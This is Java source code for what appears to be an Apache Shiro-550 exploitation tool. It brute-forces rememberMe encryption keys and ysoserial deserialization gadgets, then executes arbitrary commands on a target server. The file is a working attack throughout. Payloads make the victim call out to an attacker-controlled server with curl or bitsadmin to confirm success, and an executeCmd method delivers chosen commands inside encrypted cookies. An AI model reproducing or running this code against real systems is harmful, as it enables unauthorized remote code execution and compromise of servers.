package com.shiroexploit.vulnverifier;

import com.shiroexploit.core.AesEncrypt;
import com.shiroexploit.util.*;
import java.io.File;
import java.io.IOException;
import java.util.*;

public class Shiro550VerifierWithOutJRMP implements Verifier {
    private Config config;
    private String key;
    private List<PayloadType> gadgets;
    private boolean flag = false;

    public Shiro550VerifierWithOutJRMP(){
        System.out.println("[*] Using Shiro550VerifierWithOutJRMP");
        this.config = Config.getInstance();
        this.gadgets = new ArrayList<>();
    }

    @Override
    public void getValidGadget() throws ExploitFailedException {
        sendAllCurlPayloadsWithAllKeys();
        flag = true;
    }

    @Override
    public void executeCmd(String cmd){

        for(PayloadType type : this.gadgets){
            System.out.println("[*] Using Key " + this.key);
            System.out.println("[*] Using Gadget " + type.getName());
            System.out.println("[*] Executing command: " + cmd + "...");

            String command = "java -jar " + System.getProperty("user.dir") + File.separator + "ysoserial.jar " + type.getName() + " \"" + cmd + "\"";
            byte[] result = Tools.exec(command);
            String rememberMe = AesEncrypt.encrypt(this.key, result);

            HttpRequest.request(config.getRequestInfo(), rememberMe);
            System.out.println("[+] Done");
        }
    }


    private void sendAllCurlPayloadsWithAllKeys() throws ExploitFailedException {
        boolean flag = false;

        for(PayloadType payloadType : PayloadType.values()){
            Map<String, String> map = new HashMap<>();

            System.out.println("[*] Trying Gadget: " + payloadType.getName());

            if(config.getPlatform() == 0){
                //linux
                for(String key : config.getKeys()){
                    String uuid = UUID.randomUUID().toString().replaceAll("-", "");
                    String command = "java -jar " + System.getProperty("user.dir") + File.separator + "ysoserial.jar " + payloadType.getName() + " \"curl http://" + config.getOOBServerAddress() + ":" + config.getHTTPServicePort() + "/gadget?uuid=" + uuid + "&type=" + payloadType.getName() + "\"";
                    byte[] payload = Tools.exec(command);
                    String rememberMe = AesEncrypt.encrypt(key, payload);
                    HttpRequest.request(config.getRequestInfo(), rememberMe);
                    map.put(uuid, key + ":" + payloadType.getName());
                }
            }else{
                //windows
                for(String key : config.getKeys()){
                    String uuid = UUID.randomUUID().toString().replaceAll("-", "");
                    String command = "bitsadmin /rawreturn /transfer getfile http://" + config.getOOBServerAddress() + ":" + config.getHTTPServicePort()
                            + "/gadget?uuid=" + uuid + "%26type=" + payloadType.getName() + " C:\\windows\\temp\\download_834723.tmp";
                    command = "java -jar " + System.getProperty("user.dir") + File.separator + "ysoserial.jar " + payloadType.getName() + " \"" + command + "\"";

                    byte[] payload = Tools.exec(command);
                    String rememberMe = AesEncrypt.encrypt(key, payload);
                    HttpRequest.request(config.getRequestInfo(), rememberMe);
                    map.put(uuid, key + ":" + payloadType.getName());
                }
            }

            if(findValidGadget(map)){
                flag = true;
                if(config.isSkipIfFound()){
                    break;
                }
            }
        }

        if(!flag){
            throw new ExploitFailedException("[-] Can not find a valid key or valid gadget");
        }
    }

    private boolean findValidGadget(Map<String,String> map){
        try{
            Thread.sleep(config.getDelay() * 1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        String url = "http://" + config.getOOBServerAddress() + ":" + config.getHTTPServicePort() + "/result";
        String result = null;
        try {
            result = HttpRequest.request(url);
        } catch (IOException e) {
            e.printStackTrace();
        }
        String[] uuids = result.trim().split(",");
        Set<String> validUUID = new HashSet<>(Arrays.asList(uuids));
        Set<String> keys = map.keySet();

        //取交集的目的是防止可能的多次请求造成的错误
        validUUID.retainAll(keys);

        if(validUUID.size() == 0){
            return false;
        }

        for(String str : validUUID){
            String temp = map.get(str);
            String[] pair = temp.split(":");
            this.key = pair[0];
            PayloadType type = getType(pair[1]);
            this.gadgets.add(type);
        }

        System.out.println("[+] Find Valid Key: " + this.key);
        for(PayloadType type : this.gadgets){
            System.out.println("[+] Find Valid Gadget: " + type.getName());
        }

        return true;
    }

    public PayloadType getType(String name){
        for(PayloadType type : PayloadType.values()) {
            if(type.getName().equalsIgnoreCase(name)){
                return type;
            }
        }

        return null;
    }
}
